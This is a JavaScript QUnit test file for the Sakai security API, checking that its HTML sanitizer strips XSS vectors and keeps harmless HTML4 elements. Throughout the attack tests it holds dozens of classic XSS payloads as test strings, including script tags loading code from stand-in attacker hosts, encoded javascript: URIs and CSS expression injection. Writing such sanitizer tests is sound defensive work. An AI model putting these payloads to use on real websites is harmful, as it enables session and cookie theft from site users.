require(
    [
    "jquery",
    "sakai/sakai.api.core",
    "../../../../../tests/qunit/js/qunit.js",
    "../../../../../tests/qunit/js/sakai_qunit_lib.js"
    ], 
    function($, sakai) {

    require.ready(function() {

    module("Security");

    /*
     * Test the escape HTML function
     */

    test("Escape HTML", function(){

        var htmlString = "<a href='http://www.google.com'>Advertising my script enabled site with redirect</a>";
        var escapedExpected = "&lt;a href='http://www.google.com'&gt;Advertising my script enabled site with redirect&lt;/a&gt;";

        htmlString = sakai.api.Security.escapeHTML(htmlString);
        equals(htmlString, escapedExpected, "The escaped string is correct");

    });

    /*
     * Basic XSS cases
     */
    test("Script Attacks", function() {
        expect(8);

        var htmlString = "test<script>alert(document.cookie)</script>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("script"), -1, "Strip script tag");

        htmlString = "<<<><<script src=http://fake-evil.ru/test.js>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("script"), -1, "Strip script tag");

        htmlString = "<script<script src=http://fake-evil.ru/test.js>>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("script"), -1, "Strip script tag");

        htmlString = "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("script"), -1, "Strip script tag");

        htmlString = "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("onload"), -1, "Strip onload");

        htmlString = "<BODY ONLOAD=alert('XSS')>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("alert"), -1, "Strip alert");

        htmlString = "<iframe src=http://ha.ckers.org/scriptlet.html <";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<iframe"), -1, "Strip iframe tag");

        htmlString = "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("src"), -1, "Strip src from input");
    });

    test("Image Attacks", function() {
        expect(10);

        var htmlString = "<img src=\"http://www.myspace.com/img.gif\"/>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<img"), 0, "Don't break images");

        htmlString = "<img src=javascript:alert(document.cookie)>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("src"), -1, "Strip images with js src");

        htmlString = "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("src"), -1, "Strip images with js src");

        htmlString = "<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("src"), -1, "Strip images with js src");

        htmlString = "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("alert"), -1, "Strip images with js src");

        htmlString = "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("&amp;"), -1, "Strip images with js src");

        htmlString = "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip images with js src");

        htmlString = "<IMG SRC=\"javascript:alert('XSS')\"";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip images with js src");

        htmlString = "<IMG LOWSRC=\"javascript:alert('XSS')\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip images with js src");

        htmlString = "<BGSOUND SRC=\"javascript:alert('XSS');\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip images with js src");
    });

    test("href Attacks", function() {
        expect(33);

        var htmlString = "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("href"), -1, "Strip javascript hrefs");

        htmlString = "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("href"), -1, "Strip javascript hrefs");

        htmlString = "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("ha.ckers.org"), -1, "Strip javascript hrefs");

        htmlString = "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("ha.ckers.org"), -1, "Strip javascript hrefs");

        htmlString = "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

        htmlString = "<IMG SRC='vbscript:msgbox(\"XSS\")'>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("vbscript"), -1, "Strip javascript hrefs");

        htmlString = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<meta"), -1, "Strip javascript hrefs");

        htmlString = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<meta"), -1, "Strip javascript hrefs");

        htmlString = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<meta"), -1, "Strip javascript hrefs");

        htmlString = "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("src"), -1, "Strip javascript scr");

        htmlString = "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

        htmlString = "<TABLE BACKGROUND=\"javascript:alert('XSS')\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("background"), -1, "Strip javascript hrefs");

        htmlString = "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("background"), -1, "Strip javascript hrefs");

        htmlString = "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

        htmlString = "<DIV STYLE=\"width: expression(alert('XSS'));\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("alert"), -1, "Strip javascript hrefs");

        htmlString = "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("alert"), -1, "Strip javascript hrefs");

        htmlString = "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("ript:alert"), -1, "Strip javascript hrefs");

        htmlString = "<BASE HREF=\"javascript:alert('XSS');//\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

        htmlString = "<BaSe hReF=\"http://arbitrary.com/\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<base"), -1, "Strip javascript hrefs");

        htmlString = "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<object"), -1, "Strip javascript hrefs");

        htmlString = "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

        htmlString = "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<embed"), -1, "Strip javascript hrefs");

        htmlString = "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<embed"), -1, "Strip javascript hrefs");

        htmlString = "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

        htmlString = "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

        htmlString = "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

        htmlString = "<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

        htmlString = "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("script"), -1, "Strip javascript hrefs");

        htmlString = "<SCRIPT SRC=http://ha.ckers.org/xss.js";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

        htmlString = "<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("style"), -1, "Strip javascript hrefs");

        htmlString = "<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("aim.exe"), -1, "Strip javascript hrefs");

        htmlString = "<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

        htmlString = "<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("document"), -1, "Strip javascript hrefs");
    });

    test("CSS Attacks", function() {
        expect(4);

        var htmlString = "<div style=\"position:absolute\">";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("position"), -1, "Strip CSS positioning");

        htmlString = "<style>b { position:absolute }</style>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("position"), -1, "Strip CSS positioning");

        htmlString = "<div style=\"z-index:25\">test</div>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("z-index"), -1, "Strip CSS positioning");

        htmlString = "<style>z-index:25</style>";
        htmlString = sakai.api.Security.saneHTML(htmlString);
        equals(htmlString.indexOf("z-index"), -1, "Strip CSS positioning");
    });

    test("saneHTML elements", function() {

        /*
         * HTML4 elements from: http://www.w3.org/TR/html4/index/elements.html
         * HTML5 elements from: http://www.quackit.com/html_5/tags/ and http://www.w3schools.com/html5/
         */

        var html4ElementList = [
            '<A href="http://www.w3.org/">W3C Web site</A>',
            '<ABBR lang="es" title="Doa">Do&ntilde;a</ABBR>',
            '<acronym>data</acronym>',
            '<ADDRESS><A href="../People/Raggett/">Dave Raggett</A>,<A href="../People/Arnaud/">Arnaud Le Hors</A>,contact persons for the <A href="Activity">W3C HTML Activity</A><BR>$Date: 1999/12/24 23:37:50 $</ADDRESS>',
            '<AREA href="guide.html" alt="Access Guide" shape="rect" coords="0,0,118,28">',
            '<b>bold</b>',
            '<BDO dir="LTR">english1 2WERBEH english3</BDO>',
            '<big>big</big>',
            '<BLOCKQUOTE cite="http://www.mycom.com/tolkien/twotowers.html"><P>They went in single file, running like hounds on a strong scent, and an eager light was in their eyes. Nearly due west the broad swath of the marching Orcs tramped its ugly slot; the sweet grass of Rohan had been bruised and blackened as they passed.</P></BLOCKQUOTE>',
            '<br>',
            '<BUTTON name="submit" value="submit" type="submit">Send<IMG src="/icons/wow.gif" alt="wow"></BUTTON>',
            '<CAPTION>Cups of coffee consumed by each senator</CAPTION>',
            '<center>data</center>',
            '<CITE>[ISO-0000]</CITE>',
            '<col>',
            '<COLGROUP width="20"><COL span="39"><COL id="format-me-specially"></COLGROUP>',
            '<DL><DT>Center<DT>Centre<DD> A point equidistant from all points on the surface of a sphere.<DD> In some field sports, the player who holds the middle position on the field, court, or forward line.</DL>',
            '<P>A Sheriff can employ <DEL>3</DEL><INS>5</INS> deputies.</P>',
            '<dfn>data</dfn>',
            '<DIV id="client-boyera" class="client"><P><SPAN class="client-title">Client information:</SPAN><TABLE class="client-data"><TR><TH>Last name:<TD>Boyera</TR><TR><TH>First name:<TD>Stephane</TR><TR><TH>Tel:<TD>(212) 555-1212</TR><TR><TH>Email:<TD>sb@foo.org</TR></TABLE></DIV>',
            '<em>data</em>',
            '<FIELDSET><LEGEND>Personal Information</LEGEND>Last Name: <INPUT name="personal_lastname" type="text" tabindex="1">First Name: <INPUT name="personal_firstname" type="text" tabindex="2"> Address: <INPUT name="personal_address" type="text" tabindex="3">  ...more personal information... </FIELDSET>',
            '<FORM action="http://somesite.com/prog/adduser" method="post"><P><LABEL for="firstname">First name: </LABEL><INPUT type="text" id="firstname"><BR><LABEL for="lastname">Last name: </LABEL><INPUT type="text" id="lastname"><BR><LABEL for="email">email: </LABEL><INPUT type="text" id="email"><BR><INPUT type="radio" name="sex" value="Male"> Male<BR><INPUT type="radio" name="sex" value="Female"> Female<BR><INPUT type="submit" value="Send"> <INPUT type="reset"></P></FORM>',
            '<h1>data</h1>',
            '<h2>data</h2>',
            '<h3>data</h3>',
            '<h4>data</h4>',
            '<h5>data</h5>',
            '<h6>data</h6>',
            '<hr>',
            '<i>italic</i>',
            '<IMG src="http://www.somecompany.com/People/Ian/vacation/family.png" alt="A photo of my family at the lake.">',
            '<kbd>data</kbd>',
            '<LEGEND>Personal Information</LEGEND>',
            '<ol><li value="30"> makes this list item number 30.<li value="40"> makes this list item number 40.<li> makes this list item number 41.</ol>',
            '<MAP name="map1"><P>Navigate the site:<A href="guide.html" shape="rect" coords="0,0,118,28">Access Guide</a> | <A href="shortcut.html" shape="rect" coords="118,0,184,28">Go</A> | <A href="search.html" shape="circle" coords="184,200,60">Search</A> | <A href="top10.html" shape="poly" coords="276,0,276,28,100,200,50,50,276,0">Top Ten</A></MAP>',
            '<menu><li>Command 1</li><li>Command 2</li><li>Command 3</li></menu>',
            '<SELECT name="ComOS"><OPTION selected="selected" label="none" value="none">None</OPTION><OPTGROUP label="PortMaster 3"><OPTION label="3.7.1" value="pm3_3.7.1">PortMaster 3 with ComOS 3.7.1</OPTION><OPTION label="3.7" value="pm3_3.7">PortMaster 3 with ComOS 3.7</OPTION><OPTION label="3.5" value="pm3_3.5">PortMaster 3 with ComOS 3.5</OPTION></OPTGROUP><OPTGROUP label="PortMaster 2"><OPTION label="3.7" value="pm2_3.7">PortMaster 2 with ComOS 3.7</OPTION><OPTION label="3.5" value="pm2_3.5">PortMaster 2 with ComOS 3.5</OPTION></OPTGROUP><OPTGROUP label="IRX"><OPTION label="3.7R" value="IRX_3.7R">IRX with ComOS 3.7R</OPTION><OPTION label="3.5R" value="IRX_3.5R">IRX with ComOS 3.5R</OPTION></OPTGROUP></SELECT>',
            '<p>data</p>',
            '<PRE>Higher still and higher         From the earth thou springest       Like a cloud of fire;         The blue deep thou wingest, And singing still dost soar, and soaring ever singest.</PRE>',
            'John said, <Q lang="en-us">I saw Lucy at lunch, she told me <Q lang="en-us">Mary wants you to get some ice cream on your way home.</Q> I think I will get some at Ben and Jerry\'s, on Gloucester Road.</Q>',
            '<samp>data</samp>',
            '<small>small</small>',
            '<SPAN class="client-title">Client information:</SPAN>',
            '<strong>data</strong>',
            'H<sub>2</sub>O E = mc<sup>2</sup><SPAN lang="fr">M<sup>lle</sup> Dupont</SPAN>',
            '<TABLE><THEAD><TR><TH>...header information...</TH></THEAD><TFOOT><TR> ...footer information...</TFOOT><TBODY><TR> ...first row of block one data...<TR><TD>...second row of block one data...</TD></TBODY><TBODY><TR> ...first row of block two data...<TR> ...second row of block two data...<TR> ...third row of block two data...</TBODY></TABLE>',
            '<TEXTAREA name="thetext" rows="20" cols="80">First line of initial text.Second line of initial text.</TEXTAREA>',
            '<tt>teletype text</tt>',
            '<u>data</u>',
            '<UL><LI> ... first list item...<LI> ... second list item......</UL>',
            '<var>data</var>'
        ];

        //HTML4 Elements we expect to be removed
        var html4ElementStripList = [
            '<APPLET code="Bubbles.class" width="500" height="500">Java applet that draws animated bubbles.</APPLET>',
            '<BASE href="http://www.aviary.com/products/intro.html">',
            '<basefont size="2"></basefont>',
            '<BODY>  ... document body...</BODY>',
            '<FRAMESET cols="33%,33%,33%"><FRAMESET rows="*,200"><FRAME src="contents_of_frame1.html"><FRAME src="contents_of_frame2.gif"></FRAMESET><FRAME src="contents_of_frame3.html"><FRAME src="contents_of_frame4.html"></FRAMESET>',
            '<HEAD><TITLE>A study of population dynamics</TITLE></HEAD>',
            '<IFRAME src="foo.html" width="400" height="500" scrolling="auto" frameborder="1">[Your user agent does not support frames or is currently configured not to display frames. However, you may visit <A href="foo.html">the related document.</A>]</IFRAME>',
            '<LINK rel="Index" href="../index.html">',
            '<NOFRAMES><P>Here is the <A href="main-noframes.html"> non-frame based version of the document.</A></NOFRAMES>',
            '<NOSCRIPT><P>Access the <A href="http://someplace.com/data">data.</A></NOSCRIPT>',
            '<OBJECT codetype="application/java" classid="java:Bubbles.class" width="500" height="500">Java applet that draws animated bubbles.</OBJECT>',
            '<PARAM name="width" value="40" valuetype="data">',
            '<script>data</script>',
            '<STYLE type="text/css">H1 {border-width: 1; border: solid; text-align: center}</STYLE>',
            '<TITLE>A study of population dynamics</TITLE>'
        ];

        var html5ElementList = [
            '<address>This document was written by:<br /><a href="mailto:homer@example.com">Homer Simpson</address>',
            '<article><h4>Environmentally Friendly City</h4><p>A <a href="http://www.natural-environment.com/blog/2008/12/14/masdar-city-the-worlds-first-zero-carbon-zero-waste-city/" target="_blank">brand new city</a> is being built in Abu Dhabi in the United Arab Emirates which, when finished, will be the world’s first zero carbon, zero waste city.</p><p>Masdar City, a completely self sustaining city, will be powered by renewable energy and all waste will be recycled or reused.</p></article>',
            '<aside style="font-size:larger;font-style:italic;color:green;float:right;width:120px;">70% of the world\'s reefs will be destroyed over the next 40 years.</aside><p>Global warming is affecting coral reefs all over the world. At the current rate, 70% of the world\'s reefs will be destroyed over the next 40 years.</p><p>As hopeless as this may sound, there are things we can do to help. By developing greener habits, we can all do our part in reducing global warming. For example, here are <a href="http://www.natural-environment.com/blog/2008/01/29/5-easy-ways-to-reduce-greenhouse-gas/" target="_blank">5 ways to reduce greenhouse gases</a>.  And here are some simple steps you can take to <a href="http://www.natural-environment.com/sustainable_living/sustainable_habits.php" target="_blank">live sustainably</a>.</p>',
            '<audio src="/music/lostmojo.wav"><p>If you are reading this, it is because your browser does not support the audio element.</p></audio>',
            '<bdo dir="rtl">How to override text direction? I think you already know!</bdo>',
            '<command type="command">Click Me!</command>',
            '<h4>Example 1 (for HTML 5 browsers)</h4><p> <label>  Enter your favorite cartoon character:<br />  <input type="text" name="favCharacter" list="characters">  <datalist id="characters">   <option value="Homer Simpson">   <option value="Bart">   <option value="Fred Flinstone">  </datalist> </label><br /></p><h4>Example 2 (for both legacy and HTML 5 browsers)</h4><p> <label>  Enter your favorite cartoon character:<br />  <input type="text" name="favCharacter" list="characters"><br /> </label> <datalist id="characters">  <label>   or select one from the list:<br />   <select name="favCharacter">    <option>Homer Simpson    <option>Bart    <option>Fred Flinstone   </select>  </label> </datalist></p>',
            '<details open="open"><p>If your browser supports this element, it should allow you to expand and collapse these details.</p></details>',
            '<canvas id="myCanvas" width="300" height="200">Your browser does not support the canvas tag. At the time of writing, Firefox, Opera, and Chrome support this tag.</p><p>Here\'s an <a href="/pix/html_5/tags/html_canvas_tag.gif">image of what it\'s supposed to look like</a>.</canvas>',
            '<embed type="video/quicktime" src="/web_design/paris_vegas.mov" width="340" height="140" />',
            '<eventsource></eventsource>',
            '<figure id="1"><figcaption>Figure 1. JavaScript Alert Box.</figcaption><pre><code>alert(\'Hello!\');</code></pre></figure>',
            '<footer>2009 Woofer Dog Corporation</footer>',
            '<header><span style="color:brown;font-style:italic;">Woofer Dog: Version 1.0</span><hr><hgroup><h1>Talking Dogs</h1><h2>Humans aren\'t the only talkers!</h2></hgroup></header>',
            '<hgroup><h1>Talking Dogs</h1><h2>Humans aren\'t the only talkers!</h2></hgroup>',
            '<keygen name="security" />',
            '<mark style="background-color:yellow;">increased by 100 percent</mark>',
            '<ul><li><meter>25%</meter></li><li><meter>1/4</meter></li><li><meter>200 out of 800</meter></li><li><meter>max: 100; current: 25</meter></li><li><meter min="0" max="100" value="25"></meter></li></ul>',
            '<nav><a href="/css/" target="_blank">CSS</a> | <a href="/html/" target="_blank">HTML</a> | <a href="/javascript/" target="_blank">JavaScript</a> | <a href="/sql/tutorial/" target="_blank">SQL</a></nav>',
            '<input name="numa" type="number"> +<input name="numb" type="number"> =<output name="result" onforminput="value=numa.valueAsNumber + numb.valueAsNumber"></output>',
            'Downloading now. Progress...<progress value="250" max="1000"><span id="downloadProgress">25</span>%</progress>',
            '<p lang="zh-CN">...<ruby>  <rt> hn </rt>  <rt> z  </rt></ruby>...</p>',
            '<p lang="ja">... <ruby>  <rp>(</rp><rt></rt><rp>)</rp>  <rp>(</rp><rt></rt><rp>)</rp></ruby>...</p>',
            '<audio><source src="/music/good_enough.wma" type="audio/x-ms-wma"><source src="/music/good_enough.mp3" type="audio/mpeg"><p>If you are reading this, it is because your browser does not support the HTML \'audio\' element.</p></audio>',
            '<details><summary>Name</summary><p>Homer J Simpson</p></details>',
            '<p>On Saturdays, we open at <time>09:00</time>.</p>',
            'At the bottom of the search results screen, we have added "Next <var>n</var>" functionality to allow the user to view more than one screen of search results.',
            '<video src="/video/pass-countdown.ogg" width="300" height="150" controls><p>If you are reading this, it is because your browser does not support the HTML5 video element.</p></video>',
            '<p>And the world record for the longest place name in an English-speaking country is...<br><i>Taumata<wbr>whakatangihanga<wbr>koauau<wbr>o<wbr>tamatea<wbr>turi<wbr>pukakapiki<wbr>maunga<wbr>horo<wbr>nuku<wbr>pokai<wbr>whenua<wbr>kitanatahu</i></p><p>This is the name of a hill in New Zealand.</p><p>Here\'s what it looks like without using the <code>wbr</code> tag...<i>Taumatawhakatangihangakoauauotamateaturipukakapikimaungahoronukupokaiwhenuakitanatahu</i></p>'
        ];

        expect(html4ElementList.length + html4ElementStripList.length);

        var htmlString = "", sanitizedHtmlString = "";

        for (var i in html4ElementList) {
            if (html4ElementList.hasOwnProperty(i)) {
                 htmlString = html4ElementList[i].toLowerCase();
                 sanitizedHtmlString = sakai.api.Security.saneHTML(htmlString);
                 equals(sanitizedHtmlString.indexOf(htmlString), 0, "Keep HTML4 element intact: " + htmlString);
            }
        }

        for (var i in html4ElementStripList) {
            if (html4ElementStripList.hasOwnProperty(i)) {
                 htmlString = html4ElementStripList[i].toLowerCase();
                 sanitizedHtmlString = sakai.api.Security.saneHTML(htmlString);
                 equals(sanitizedHtmlString.indexOf(htmlString), -1, "Strip HTML4 element: " + htmlString);
            }
        }

        // html5 elements not yet supported by google caja - SAKIII-2473
        /*for (var j in html5ElementList) {
            if (html5ElementList.hasOwnProperty(j)) {
                 htmlString = html5ElementList[j].toLowerCase();
                 sanitizedHtmlString = sakai.api.Security.saneHTML(htmlString);
                 equals(sanitizedHtmlString.indexOf(htmlString), 0, "Keep HTML5 element intact: " + htmlString);
            }
        }*/
    });

    });
});
